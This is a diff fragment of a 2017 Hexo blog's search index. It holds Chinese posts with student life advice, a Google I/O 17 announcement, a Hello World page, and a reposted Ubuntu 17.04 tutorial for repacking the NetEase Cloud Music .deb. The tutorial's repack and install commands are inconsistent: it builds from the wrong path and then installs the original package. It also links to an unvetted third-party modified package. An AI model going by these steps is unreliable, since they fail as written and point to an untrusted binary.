+<p>我以一个过来人的经验，真心建议你们，大学这些事必须要做了，甚至比拿什么奖学金，考什么证还要重要。</p>
+<p>多运动，坚持运动，有个好的身体比什么都重要。</p>
+<p>多阅读，坚持阅读，哪怕跟你的专业无关的书籍。</p>
+<p>考个驾照，一定要考，这个是 100% 所有工作之后的人最后悔的一件事，是的，就是 100%。</p>
+<p>如果可以的话，谈场恋爱吧，哪怕最后以失败告终。</p>
+<p>PS：以上就是我过来人的经验之谈，希望可以对更多的人有帮助，觉得有用，可以随手转发，谢谢。</p>
+]]></content>
+      
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[Google I/O 17]]></title>
+      <url>http://yoursite.com/2017/05/10/Google-I-O-17-1/</url>
+      <content type="html"><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><h1 id="Google-I-O-17—May-17-19-2017"><a href="#Google-I-O-17—May-17-19-2017" class="headerlink" title="Google I/O 17—May 17-19, 2017"></a><font size="20">Google I/O 17</font>—May 17-19, 2017</h1><p><br></p>
+<svg width="277" height="95" viewbox="0 0 277 95" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd"><path fill="#5471F9" d="M195.129 90.674h6.85V2.514h-6.85zm-111.083 0h6.85V24.919h-6.85zM81.709 8.359c0-3.238 2.619-5.845 5.871-5.845 3.253 0 5.872 2.607 5.872 5.845 0 3.237-2.62 5.845-5.872 5.845s-5.871-2.608-5.871-5.845M220.1 9.81l-.014-7.191 40.773-.082.014 7.192z"/><path fill="#40E7B8" d="M232.99 92.868l-6.122-3.06 43.927-87.052 6.122 3.06z"/><path fill="#5471F9" d="M147.112 38.276L143.7 21.693l2.409-.32 3.39 16.581z"/><path stroke="#5471F9" stroke-width=".5" d="M147.112 38.276L143.7 21.693l2.409-.32 3.39 16.581z"/><path fill="#5471F9" d="M154.681 42.097l3.674-16.528 2.33.686-3.691 16.517z"/><path stroke="#5471F9" stroke-width=".5" d="M154.681 42.097l3.674-16.528 2.33.686-3.691 16.517z"/><path fill="#5471F9" d="M160.062 48.656l10.075-13.638 1.852 1.565-10.086 13.62z"/><path stroke="#5471F9" stroke-width=".5" d="M160.062 48.656l10.075-13.638 1.852 1.565-10.086 13.62z"/><path fill="#5471F9" d="M162.295 56.817l14.79-8.357 1.05 2.182-14.794 8.336z"/><path stroke="#5471F9" stroke-width=".5" d="M162.295 56.817l14.79-8.357 1.05 2.182-14.794 8.336z"/><path fill="#5471F9" d="M161.014 65.196l16.922-1.697.074 2.418-16.916 1.677z"/><path stroke="#5471F9" stroke-width=".5" d="M161.014 65.196l16.922-1.697.074 2.418-16.916 1.677z"/><path fill="#5471F9" d="M156.424 72.312l16.152 5.301-.92 2.238-16.138-5.317z"/><path stroke="#5471F9" stroke-width=".5" d="M156.424 72.312l16.152 5.301-.92 2.238-16.138-5.317z"/><path fill="#5471F9" d="M149.331 76.977l12.615 11.353-1.751 1.677-12.597-11.363z"/><path stroke="#5471F9" stroke-width=".5" d="M149.331 76.977l12.615 11.353-1.751 1.677-12.597-11.363z"/><path fill="#5471F9" d="M140.96 78.353l6.81 15.512-2.29.811-6.788-15.513z"/><path stroke="#5471F9" stroke-width=".5" d="M140.96 78.353l6.81 15.512-2.29.811-6.788-15.513z"/><path fill="#5471F9" d="M132.715 76.253l-.02 16.927-2.424-.171.04-16.92z"/><path stroke="#5471F9" stroke-width=".5" d="M132.715 76.253l-.02 16.927-2.424-.171.04-16.92z"/><path fill="#5471F9" d="M126.049 70.982l-6.923 15.462-2.145-1.136 6.937-15.448z"/><path stroke="#5471F9" stroke-width=".5" d="M126.049 70.982l-6.923 15.462-2.145-1.136 6.937-15.448z"/><path fill="#5471F9" d="M122.106 63.49l-12.627 11.34-1.498-1.904 12.634-11.32z"/><path stroke="#5471F9" stroke-width=".5" d="M122.106 63.49l-12.627 11.34-1.498-1.904 12.634-11.32z"/><path fill="#5471F9" d="M121.573 55.072l-16.188 5.192-.582-2.348 16.187-5.17z"/><path stroke="#5471F9" stroke-width=".5" d="M121.573 55.072l-16.188 5.192-.582-2.348 16.187-5.17z"/><path fill="#5471F9" d="M124.507 47.11l-16.917-1.736.417-2.382 16.908 1.754z"/><path stroke="#5471F9" stroke-width=".5" d="M124.507 47.11l-16.917-1.736.417-2.382 16.908 1.754z"/><path fill="#5471F9" d="M130.436 41.046l-14.764-8.403 1.35-2.01 14.748 8.415z"/><path stroke="#5471F9" stroke-width=".5" d="M130.436 41.046l-14.764-8.403 1.35-2.01 14.748 8.415z"/><path fill="#5471F9" d="M138.337 37.891l-10.053-13.653 2.054-1.291 10.034 13.66z"/><path stroke="#5471F9" stroke-width=".5" d="M138.337 37.891l-10.053-13.653 2.054-1.291 10.034 13.66z"/><path fill="#40E7B8" d="M46.11 21.874l-.006-3.01 17.065-.033.005 3.01zm-22.642 0l-.006-3.01 17.064-.033.006 3.01zm-23.462 0L0 18.864l17.064-.033.006 3.01zM46.11 44.615l-.006-3.01 17.065-.034.005 3.01zm-22.642 0l-.006-3.01 17.064-.034.006 3.01zm-23.462 0L0 41.605l17.064-.034.006 3.01z"/><path fill="#32E8B7" d="M21.897 17.472l-3.024.006L18.839.493l3.024-.005z"/><path fill="#40E7B8" d="M21.897 40.008l-3.023.006-.035-16.984 3.024-.006zm0 23.352l-3.023.006-.035-16.984 3.024-.006z"/><path fill="#32E8B7" d="M44.745 17.472l-3.024.006L41.687.493 44.71.488z"/><path fill="#40E7B8" d="M44.745 40.008l-3.024.006-.034-16.984 3.023-.006zm0 23.352l-3.024.006-.034-16.984 3.023-.006z"/></g></svg>
+
+<p><br></p>
+<font size="6"><strong>Google I/O is an annual developer festival held at the outdoor Shoreline Amphitheatre.</strong></font><br><br><font size="5">May 17-19, 2017</font><br><br><font size="4">Shoreline Amphitheatre Mountain View, California</font>
+
+<p><br></p>
+<iframe src="https://events.google.com/io/embed" style="width:700px;height:360px" frameborder="0" allowfullscreen></iframe>
+
+<p>​    </p>
+<p><br><font size="4">官方网站：<a href="https://events.google.com/io/" target="_blank" rel="noopener">Google I/O17</a></font></p>
+]]></content>
+      
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[修复Ubuntu17.04无法安装网易云音乐问题（转载）]]></title>
+      <url>http://yoursite.com/2017/04/17/%E4%BF%AE%E5%A4%8DUbuntu17.04%E6%97%A0%E6%B3%95%E5%AE%89%E8%A3%85%E7%BD%91%E6%98%93%E4%BA%91%E9%9F%B3%E4%B9%90%E9%97%AE%E9%A2%98/</url>
+      <content type="html"><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><p>装了Ubuntu17.04的用户会出现这一问题，原因是libqt5libqgtk2的依赖问题，这里需要将其替换为qt5-style-plugins.教程如下（以下内容来自互联网）：</p>
+<p>1.下载deb包，备用</p>
+<p><a href="http://music.163.com/#/download" target="_blank" rel="noopener">网易云音乐</a></p>
+<p>2.安装一些编译时需要的程序 </p>
+<p><code>sudo apt-get install build-essential debhelper make autoconf automake dpkg-dev fakeroot pbuilder gnupg</code></p>
+<p>3.解包</p>
+<p>建立目录<br><code>sudo mkdir -p netease/DEBIAN</code></p>
+<p><code>sudo mkdir fix</code></p>
+<p>解包<br><code>sudo dpkg -x netease-cloud-music_1.0.0_amd64_ubuntu16.04.deb ./netease</code></p>
+<p>解出控制文件<br><code>sudo dpkg -e netease-cloud-music_1.0.0_amd64_ubuntu16.04.deb netease/DEBIAN/</code></p>
+<p>修改控制文件<br><code>sudo gedit netease/DEBIAN/control</code></p>
+<p>找到 libqt5libqgtk2 ，替换为 qt5-style-plugins ，保存，退出。</p>
+<p>4.重新打包</p>
+<p><code>sudo dpkg-deb -b netease/fix/</code></p>
+<p>5.安装</p>
+<p><code>sudo dpkg -i netease-cloud-music_1.0.0_amd64_ubuntu16.04.deb</code></p>
+<p>6.至此，理论上不会出错。</p>
+<p>（如若报错尝试命令<code>sudo apt-get install -f</code>）</p>
+<p>PS:修改过的包</p>
+<p><a href="https://mega.nz/#!DtcQgLaT" target="_blank" rel="noopener">网易云音乐fixed</a>    密钥：!aTE_wj3jalmc7Gu5rxhgM3WpLtGzv6ymBrbgJCpDEIg</p>
+]]></content>
+      
+        <categories>
+            
+            <category> Tips </category>
+            
+        </categories>
+        
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[Hello World]]></title>
+      <url>http://yoursite.com/2017/02/17/Hello-World/</url>
+      <content type="html"><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><p><a href="https://miao.su/image/jOMk0" target="_blank" rel="noopener"><img src="https://miao.su/images/2017/04/30/6c2fc79ely1fetwfnj13oj20pp0bzwgz3127f.md.jpg" alt="6c2fc79ely1fetwfnj13oj20pp0bzwgz3127f.md.jpg"></a><br><a href="https://miao.su/image/jOJYO" target="_blank" rel="noopener"><img src="https://miao.su/images/2017/04/30/6c2fc79ely1fetwfnrishj20pp0bzmzqb2fe6.md.jpg" alt="6c2fc79ely1fetwfnrishj20pp0bzmzqb2fe6.md.jpg"></a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> HelloWorld </category>
+            
+        </categories>
+        
+        
+    </entry>
+    
+  
+  
 </search>
